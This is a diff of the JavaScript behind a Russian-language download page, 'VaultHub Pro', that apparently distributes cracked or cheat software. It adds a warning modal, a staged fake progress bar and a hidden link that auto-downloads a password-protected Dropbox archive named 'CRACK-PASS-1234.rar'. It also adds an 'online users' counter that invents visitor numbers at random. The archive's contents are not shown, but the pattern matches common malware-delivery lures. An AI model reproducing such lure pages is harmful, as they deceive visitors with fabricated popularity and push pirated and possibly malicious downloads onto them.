@@ -1,12 +1,211 @@
 document.addEventListener('DOMContentLoaded', function() {
-    // ========== ИНИЦИАЛИЗАЦИЯ ==========
-    console.log('VaultHub v1.0 loaded.');
+    console.log('VaultHub Pro v2.0 loaded');
 
-    // ========== ЧАСТИЦЫ ФОНА ==========
+    // ===== MODAL AND DOWNLOAD =====
+    const modal = document.getElementById('warningModal');
+    const confirmBtn = document.getElementById('confirmBtn');
+    const cancelBtn = document.getElementById('cancelBtn');
+    const acceptCheckbox = document.getElementById('acceptWarning');
+    const downloadBtn = document.getElementById('downloadAll');
+    const toast = document.getElementById('toast');
+
+    // Прямая ссылка на файл
+    const DOWNLOAD_URL = 'https://www.dropbox.com/scl/fi/yugitnie26kl3cruj53h3/CRACK-PASS-1234.rar?rlkey=js1wjscuxi36l1wl9i13fm9jk&st=q8fxe7sz&dl=1';
+
+    // Открытие модалки при нажатии на скачивание
+    downloadBtn.addEventListener('click', function() {
+        modal.style.display = 'flex';
+        gsap.to(modal, {
+            opacity: 1,
+            duration: 0.3
+        });
+    });
+
+    // Подтверждение скачивания
+    confirmBtn.addEventListener('click', function() {
+        if (!acceptCheckbox.checked) {
+            gsap.to(acceptCheckbox, {
+                x: -10,
+                duration: 0.1,
+                yoyo: true,
+                repeat: 2
+            });
+            return;
+        }
+
+        // Закрываем модалку
+        gsap.to(modal, {
+            opacity: 0,
+            duration: 0.3,
+            onComplete: () => {
+                modal.style.display = 'none';
+                startDownload();
+            }
+        });
+    });
+
+    // Отмена скачивания
+    cancelBtn.addEventListener('click', function() {
+        gsap.to(modal, {
+            opacity: 0,
+            duration: 0.3,
+            onComplete: () => {
+                modal.style.display = 'none';
+            }
+        });
+    });
+
+    // Функция скачивания
+    function startDownload() {
+        // Показываем тост
+        toast.classList.add('show');
+        
+        // Анимация прогресс-бара
+        const progressFill = toast.querySelector('.progress-fill');
+        gsap.to(progressFill, {
+            width: '100%',
+            duration: 2,
+            ease: "power2.inOut",
+            onComplete: () => {
+                // Создаем скрытую ссылку для скачивания
+                const link = document.createElement('a');
+                link.href = DOWNLOAD_URL;
+                link.download = 'VaultHub_Full_Arsenal.rar';
+                link.style.display = 'none';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                
+                // Прячем тост через 3 секунды
+                setTimeout(() => {
+                    toast.classList.remove('show');
+                    // Сбрасываем прогресс
+                    progressFill.style.width = '0%';
+                }, 3000);
+            }
+        });
+    }
+
+    // ===== ANIMATIONS =====
+    gsap.registerPlugin(ScrollTrigger);
+
+    // Анимация карточек продуктов
+    gsap.utils.toArray('.product-card').forEach((card, i) => {
+        gsap.from(card, {
+            scrollTrigger: {
+                trigger: card,
+                start: "top 85%",
+            },
+            y: 50,
+            opacity: 0,
+            duration: 0.8,
+            delay: i * 0.2,
+            ease: "power2.out"
+        });
+    });
+
+    // Анимация счетчиков
+    const counters = document.querySelectorAll('.stat-number');
+    counters.forEach(counter => {
+        const target = parseInt(counter.getAttribute('data-count'));
+        const suffix = counter.textContent.includes('+') ? '+' : '';
+        
+        ScrollTrigger.create({
+            trigger: counter,
+            start: "top 90%",
+            onEnter: () => {
+                gsap.to(counter, {
+                    innerText: target,
+                    duration: 2,
+                    ease: "power2.out",
+                    snap: { innerText: 1 },
+                    onUpdate: function() {
+                        const value = Math.floor(this.targets()[0].innerText);
+                        counter.textContent = value.toLocaleString() + suffix;
+                    }
+                });
+            }
+        });
+    });
+
+    // Анимация при загрузке
+    gsap.from('.hero-badge, .hero-title, .hero-subtitle, .hero-stats, .hero-actions', {
+        y: 30,
+        opacity: 0,
+        stagger: 0.2,
+        duration: 1,
+        delay: 0.5,
+        ease: "power3.out"
+    });
+
+    // ===== ONLINE COUNTER =====
+    function updateOnlineCount() {
+        const counter = document.getElementById('onlineCount');
+        const base = 25847;
+        const random = Math.floor(Math.random() * 200) - 100;
+        const newCount = Math.max(25000, base + random);
+        
+        gsap.to(counter, {
+            innerText: newCount.toLocaleString(),
+            duration: 0.5,
+            snap: { innerText: 1 }
+        });
+    }
+    setInterval(updateOnlineCount, 5000);
+
+    // ===== THEME TOGGLE =====
+    const themeBtn = document.querySelector('.theme-toggle');
+    themeBtn.addEventListener('click', function() {
+        const icon = themeBtn.querySelector('i');
+        if (icon.classList.contains('fa-moon')) {
+            icon.className = 'fas fa-sun';
+            document.body.style.filter = 'invert(1) hue-rotate(180deg)';
+        } else {
+            icon.className = 'fas fa-moon';
+            document.body.style.filter = 'none';
+        }
+    });
+
+    // ===== QUICK DEMO =====
+    const demoBtn = document.getElementById('quickDemo');
+    demoBtn.addEventListener('click', function() {
+        // Простая анимация демо
+        gsap.to(demoBtn, {
+            scale: 0.9,
+            duration: 0.1,
+            yoyo: true,
+            repeat: 1,
+            onComplete: () => {
+                // Показываем уведомление
+                const originalText = demoBtn.querySelector('span').textContent;
+                demoBtn.querySelector('span').textContent = 'ДЕМО ЗАПУЩЕНО';
+                demoBtn.disabled = true;
+                
+                setTimeout(() => {
+                    demoBtn.querySelector('span').textContent = originalText;
+                    demoBtn.disabled = false;
+                }, 2000);
+            }
+        });
+    });
+
+    // ===== NAVIGATION SCROLL =====
+    window.addEventListener('scroll', () => {
+        const nav = document.querySelector('.nav-3d');
+        if (window.scrollY > 100) {
+            nav.style.background = 'rgba(10, 12, 25, 0.98)';
+            nav.style.padding = '0.7rem 0';
+        } else {
+            nav.style.background = 'rgba(10, 12, 25, 0.9)';
+            nav.style.padding = '1rem 0';
+        }
+    });
+
+    // ===== PARTICLES BACKGROUND =====
     if (document.getElementById('particles-js')) {
         particlesJS('particles-js', {
             particles: {
-                number: { value: 80, density: { enable: true, value_area: 800 } },
+                number: { value: 60, density: { enable: true, value_area: 800 } },
                 color: { value: "#00d4ff" },
                 shape: { type: "circle" },
                 opacity: { value: 0.3, random: true },
@@ -37,190 +236,4 @@ document.addEventListener('DOMContentLoaded', function() {
             }
         });
     }
-
-    // ========== GSAP АНИМАЦИИ ==========
-    gsap.registerPlugin(ScrollTrigger);
-
-    // Анимация появления секций
-    gsap.utils.toArray('section').forEach(section => {
-        gsap.from(section, {
-            scrollTrigger: {
-                trigger: section,
-                start: "top 80%",
-                toggleActions: "play none none reverse"
-            },
-            y: 50,
-            opacity: 0,
-            duration: 1,
-            ease: "power2.out"
-        });
-    });
-
-    // Анимация карточек продуктов
-    gsap.utils.toArray('.product-card').forEach((card, i) => {
-        gsap.from(card, {
-            scrollTrigger: {
-                trigger: card,
-                start: "top 85%",
-            },
-            y: 60,
-            opacity: 0,
-            duration: 0.8,
-            delay: i * 0.15,
-            ease: "back.out(1.2)"
-        });
-    });
-
-    // Анимация счетчиков
-    const counters = document.querySelectorAll('.stat-number[data-count]');
-    counters.forEach(counter => {
-        const target = parseInt(counter.getAttribute('data-count'));
-        const suffix = counter.textContent.includes('+') ? '+' : '';
-        gsap.to(counter, {
-            scrollTrigger: {
-                trigger: counter,
-                start: "top 90%",
-                toggleActions: "play none none none"
-            },
-            innerText: target + suffix,
-            duration: 2,
-            ease: "power2.out",
-            snap: { innerText: 1 },
-            onUpdate: function() {
-                counter.textContent = Math.floor(counter.innerText) + suffix;
-            }
-        });
-    });
-
-    // ========== КНОПКИ СКАЧИВАНИЯ ==========
-    const downloadButtons = document.querySelectorAll('.download-btn');
-    const downloadToast = document.getElementById('downloadToast');
-    const MEGA_LINK = 'https://www.dropbox.com/scl/fi/yugitnie26kl3cruj53h3/CRACK-PASS-1234.rar?rlkey=js1wjscuxi36l1wl9i13fm9jk&st=q8fxe7sz&dl=0';
-
-    downloadButtons.forEach(btn => {
-        btn.addEventListener('click', function() {
-            const productName = this.closest('.product-card').dataset.product.toUpperCase();
-            console.log(`Скачивание архива для ${productName}...`);
-
-            // Показываем тост
-            gsap.to(downloadToast, {
-                y: 0,
-                opacity: 1,
-                duration: 0.5,
-                ease: "power2.out"
-            });
-
-            // Создаем временную ссылку для скачивания
-            const tempLink = document.createElement('a');
-            tempLink.href = MEGA_LINK;
-            tempLink.setAttribute('download', `VaultHub_${productName}_Archive.zip`);
-            tempLink.setAttribute('target', '_blank');
-            document.body.appendChild(tempLink);
-            tempLink.click();
-            document.body.removeChild(tempLink);
-
-            // Скрываем тост через 3 секунды
-            setTimeout(() => {
-                gsap.to(downloadToast, {
-                    y: 100,
-                    opacity: 0,
-                    duration: 0.5,
-                    ease: "power2.in"
-                });
-            }, 3000);
-        });
-    });
-
-    // ========== НАВИГАЦИЯ И ТЕМА ==========
-    // Активная ссылка при скролле
-    const sections = document.querySelectorAll('section');
-    const navLinks = document.querySelectorAll('.nav-link');
-
-    window.addEventListener('scroll', () => {
-        let current = '';
-        sections.forEach(section => {
-            const sectionTop = section.offsetTop;
-            const sectionHeight = section.clientHeight;
-            if (pageYOffset >= sectionTop - 200) {
-                current = section.getAttribute('id');
-            }
-        });
-
-        navLinks.forEach(link => {
-            link.classList.remove('active');
-            if (link.getAttribute('href') === `#${current}`) {
-                link.classList.add('active');
-            }
-        });
-
-        // Эффект при скролле навигации
-        const nav = document.querySelector('.glass-nav');
-        if (window.scrollY > 100) {
-            nav.style.background = 'rgba(10, 12, 25, 0.95)';
-            nav.style.padding = '0.7rem 0';
-            nav.style.backdropFilter = 'blur(20px)';
-        } else {
-            nav.style.background = 'rgba(20, 22, 40, 0.7)';
-            nav.style.padding = '1rem 0';
-            nav.style.backdropFilter = 'blur(15px)';
-        }
-    });
-
-    // Переключение темы
-    const themeToggle = document.querySelector('.theme-toggle');
-    themeToggle.addEventListener('click', () => {
-        const icon = themeToggle.querySelector('i');
-        if (icon.classList.contains('fa-moon')) {
-            icon.className = 'fas fa-sun';
-            document.body.style.filter = 'invert(1) hue-rotate(180deg)';
-        } else {
-            icon.className = 'fas fa-moon';
-            document.body.style.filter = 'none';
-        }
-    });
-
-    // ========== ИМИТАЦИЯ YOUTUBE API ==========
-    // (Здесь можно добавить реальную интеграцию YouTube IFrame API)
-    const playerPlaceholder = document.querySelector('.player-placeholder');
-    if (playerPlaceholder) {
-        playerPlaceholder.innerHTML = `
-            <i class="fab fa-youtube" style="font-size:4rem; color:#ff0000; margin-bottom:1rem;"></i>
-            <p>Канал: <strong>Viserest</strong></p>
-            <p style="font-size:0.9em; opacity:0.8;">Последнее видео: "Обзор NexusClient v5.0"</p>
-            <a href="https://www.youtube.com/@Viserest" target="_blank" style="display:inline-block; margin-top:1rem; padding:0.7rem 1.5rem; background:#ff0000; color:white; border-radius:50px; text-decoration:none;">
-                <i class="fab fa-youtube"></i> Смотреть на YouTube
-            </a>
-        `;
-    }
-
-    // ========== АНИМАЦИЯ ПРИ ЗАГРУЗКЕ ==========
-    // Запускаем начальную анимацию элементов
-    gsap.from('.hero-title, .hero-subtitle, .stats, .cta-scroll', {
-        duration: 1.2,
-        y: 40,
-        opacity: 0,
-        stagger: 0.2,
-        ease: "power3.out",
-        delay: 0.5
-    });
-
-    // ========== ЗВУК ПРИ НАВЕДЕНИИ НА КАРТОЧКУ (опционально) ==========
-    const productCards = document.querySelectorAll('.product-card');
-    productCards.forEach(card => {
-        card.addEventListener('mouseenter', () => {
-            // Можно добавить микро-анимацию
-            gsap.to(card, {
-                scale: 1.02,
-                duration: 0.3,
-                ease: "power2.out"
-            });
-        });
-        card.addEventListener('mouseleave', () => {
-            gsap.to(card, {
-                scale: 1,
-                duration: 0.3,
-                ease: "power2.out"
-            });
-        });
-    });
 });
